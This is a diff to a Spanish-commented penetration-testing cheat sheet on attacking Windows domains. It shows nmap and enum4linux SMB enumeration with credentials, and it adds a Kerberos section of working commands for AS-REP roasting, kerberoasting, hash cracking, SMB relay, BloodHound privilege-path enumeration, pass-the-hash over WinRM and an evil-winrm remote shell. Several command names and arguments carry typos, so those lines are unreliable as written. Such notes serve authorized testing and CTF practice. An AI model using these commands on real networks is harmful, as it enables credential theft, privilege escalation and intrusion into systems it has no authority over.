@@ -68,8 +68,6 @@ $nmap -p445 --script smb-enum-shares target
 
 $nmap -p445 --script smb-enum-shares target --script-args
 ...smbusername=administrator,smbpassword=smbserver_771 target
-
-
 ```
 
 ### smbmap Recon
@@ -135,3 +133,27 @@ $enum4linux -r -u "admin" -p "password1" target
 
 ```
 
+### Kerberos
+
+```bash
+# AS-REP Roasting attack, el usuario que muestre tiene configurado UF_DONT_REQUIRE_PREAUTH
+GetNPUsers.py domaindomain_name.local/ -no-pass -usersfile culos_validos.txt
+
+# intentamos crackear el hash con jhon, si conseguimos el pass toca
+# kerberoasting attack
+GetUserSPN.py 'domain_name.local/username:password' -request
+
+# no aplica psexec.py si cmp no pwnea el usuario, si no muetra nada smbmap
+
+#desplegar un smbrelay y tratando de interceptar autenticacion a nivel red si el smb no esta firmado se puede tratar de coger la autenticacion de un usuario privs, es un hash a nivel de red no permite hacer cepas de hash o retocar el responder.conf indicadno las target.
+# apt install bloodhound neo4j
+neo4j console
+# bloodhound para enumerar, detectar vias para escalar privs
+bloodhound-python.py -c all -u 'culo' -p 'culo' -ns 10.10.10.10 -d domainname.local
+
+# pass de hash
+cmp winrm doman -u 'culo' -H 'HASH'
+# este usuario pertenece al grupo remote management users
+evil-winrm -i domain -u 'culo'
+
+```
